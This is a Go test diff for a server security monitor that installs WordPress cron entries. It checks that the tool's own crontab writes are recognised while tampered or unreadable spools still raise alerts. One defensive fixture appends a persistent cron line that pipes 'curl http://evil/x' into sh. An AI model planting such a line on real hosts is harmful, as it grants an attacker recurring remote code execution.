@@ -467,6 +467,188 @@ func TestInstallUserWPCronSerializesPerUserCrontabWrites(t *testing.T) {
 	}
 }
 
+func TestInstallUserWPCronSuppressesRealtimeEventDuringInstall(t *testing.T) {
+	resetSelfWrites(t)
+	docroot := "/home/alice/public_html"
+	path := "/var/spool/cron/alice"
+	var spool []byte
+	withMockOS(t, &mockOS{readFile: func(name string) ([]byte, error) {
+		if name == path && spool != nil {
+			return append([]byte(nil), spool...), nil
+		}
+		return nil, os.ErrNotExist
+	}})
+	withMockCmd(t, &mockCmd{
+		runAllowNonZero: func(string, ...string) ([]byte, error) { return nil, nil },
+		run: func(name string, args ...string) ([]byte, error) {
+			if name != "crontab" || containsArg(args, "-l") {
+				return nil, nil
+			}
+			data, err := os.ReadFile(args[len(args)-1])
+			if err != nil {
+				return nil, err
+			}
+			spool = append([]byte(nil), data...)
+			if _, emit := EvaluateSensitiveFileWrite(path, 0, 1234, "crontab"); emit {
+				t.Error("realtime crontab write must be suppressed while install is still returning")
+			}
+			return nil, nil
+		},
+	})
+
+	installed, err := installUserWPCron("alice", docroot, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
+	if err != nil {
+		t.Fatalf("installUserWPCron: %v", err)
+	}
+	if !installed {
+		t.Fatal("expected crontab install")
+	}
+}
+
+func TestInstallUserWPCronRecordsOnDiskSpoolContent(t *testing.T) {
+	resetSelfWrites(t)
+	docroot := "/home/alice/public_html"
+	path := "/var/spool/cron/alice"
+	var staged []byte
+	var spool []byte
+	withMockOS(t, &mockOS{readFile: func(name string) ([]byte, error) {
+		if name == path && spool != nil {
+			return append([]byte(nil), spool...), nil
+		}
+		return nil, os.ErrNotExist
+	}})
+	withMockCmd(t, &mockCmd{
+		runAllowNonZero: func(string, ...string) ([]byte, error) { return nil, nil },
+		run: func(name string, args ...string) ([]byte, error) {
+			if name != "crontab" || containsArg(args, "-l") {
+				return nil, nil
+			}
+			data, err := os.ReadFile(args[len(args)-1])
+			if err != nil {
+				return nil, err
+			}
+			staged = append([]byte(nil), data...)
+			spool = []byte(strings.ReplaceAll(string(data), "\n", "\r\n"))
+			return nil, nil
+		},
+	})
+
+	installed, err := installUserWPCron("alice", docroot, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
+	if err != nil {
+		t.Fatalf("installUserWPCron: %v", err)
+	}
+	if !installed {
+		t.Fatal("expected crontab install")
+	}
+	if string(staged) == string(spool) {
+		t.Fatal("test did not create distinct staged and on-disk crontab bytes")
+	}
+	if !isExpectedSelfWrite(path, spool) {
+		t.Fatal("installed crontab should record the on-disk spool bytes")
+	}
+	if isExpectedSelfWrite(path, staged) {
+		t.Fatal("installed crontab must not keep the staged buffer hash")
+	}
+}
+
+func TestInstallUserWPCronDoesNotRecordTamperedSpool(t *testing.T) {
+	resetSelfWrites(t)
+	docroot := "/home/alice/public_html"
+	path := "/var/spool/cron/alice"
+	var spool []byte
+	withMockOS(t, &mockOS{readFile: func(name string) ([]byte, error) {
+		if name == path && spool != nil {
+			return append([]byte(nil), spool...), nil
+		}
+		return nil, os.ErrNotExist
+	}})
+	withMockCmd(t, &mockCmd{
+		runAllowNonZero: func(string, ...string) ([]byte, error) { return nil, nil },
+		run: func(name string, args ...string) ([]byte, error) {
+			if name != "crontab" || containsArg(args, "-l") {
+				return nil, nil
+			}
+			data, err := os.ReadFile(args[len(args)-1])
+			if err != nil {
+				return nil, err
+			}
+			spool = append(append([]byte(nil), data...), []byte("* * * * * curl http://evil/x | sh\n")...)
+			return nil, nil
+		},
+	})
+
+	installed, err := installUserWPCron("alice", docroot, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
+	if err != nil {
+		t.Fatalf("installUserWPCron: %v", err)
+	}
+	if !installed {
+		t.Fatal("expected crontab install")
+	}
+	if isExpectedSelfWrite(path, spool) {
+		t.Fatal("tampered spool content must not be recorded as a CSM self-write")
+	}
+	if _, emit := EvaluateSensitiveFileWrite(path, 0, 1234, "crontab"); !emit {
+		t.Fatal("tampered spool content must still raise a sensitive-file finding")
+	}
+}
+
+func TestRecordCrontabSelfWriteUnreadableFailsSafe(t *testing.T) {
+	resetSelfWrites(t)
+	path := "/var/spool/cron/alice"
+	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return nil, os.ErrPermission }})
+
+	recordCrontabSelfWrite("alice", []byte("*/5 * * * * php wp-cron.php\n"))
+
+	if _, emit := EvaluateSensitiveFileWrite(path, 0, 1234, "crontab"); !emit {
+		t.Fatal("unreadable crontab spool must not be suppressed")
+	}
+}
+
+func TestInstallUserWPCronClearsPendingSelfWriteOnInstallFailure(t *testing.T) {
+	resetSelfWrites(t)
+	docroot := "/home/alice/public_html"
+	path := "/var/spool/cron/alice"
+	var staged []byte
+	withMockCmd(t, &mockCmd{
+		runAllowNonZero: func(string, ...string) ([]byte, error) { return nil, nil },
+		run: func(name string, args ...string) ([]byte, error) {
+			if name != "crontab" || containsArg(args, "-l") {
+				return nil, nil
+			}
+			data, err := os.ReadFile(args[len(args)-1])
+			if err != nil {
+				return nil, err
+			}
+			staged = append([]byte(nil), data...)
+			return nil, fmt.Errorf("install failed")
+		},
+	})
+
+	installed, err := installUserWPCron("alice", docroot, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
+	if err == nil {
+		t.Fatal("expected crontab install failure")
+	}
+	if installed {
+		t.Fatal("failed crontab install must report installed=false")
+	}
+	if isExpectedSelfWrite(path, staged) {
+		t.Fatal("failed crontab install must clear the pending self-write record")
+	}
+}
+
+func TestCrontabContentEqualAllowsOnlySafeNormalization(t *testing.T) {
+	expected := []byte("# CSM WP-Cron /home/alice/public_html\n*/5 * * * * php wp-cron.php\n")
+	if !crontabContentEqual([]byte("# CSM WP-Cron /home/alice/public_html\r\n*/5 * * * * php wp-cron.php\r\n"), expected) {
+		t.Fatal("CRLF line endings should match the expected crontab content")
+	}
+	if !crontabContentEqual([]byte("# CSM WP-Cron /home/alice/public_html\n*/5 * * * * php wp-cron.php"), expected) {
+		t.Fatal("a missing final newline should match the expected crontab content")
+	}
+	if crontabContentEqual([]byte("# CSM WP-Cron /home/alice/public_html\n*/5 * * * * php wp-cron.php\n\n"), expected) {
+		t.Fatal("an extra appended blank line must not match the expected crontab content")
+	}
+}
+
 func TestFileOwnerNameRefusesRootOwned(t *testing.T) {
 	// /etc/passwd is uid 0 on Linux and macOS; gives a real root-owned inode
 	// to exercise the guard without needing privileges.
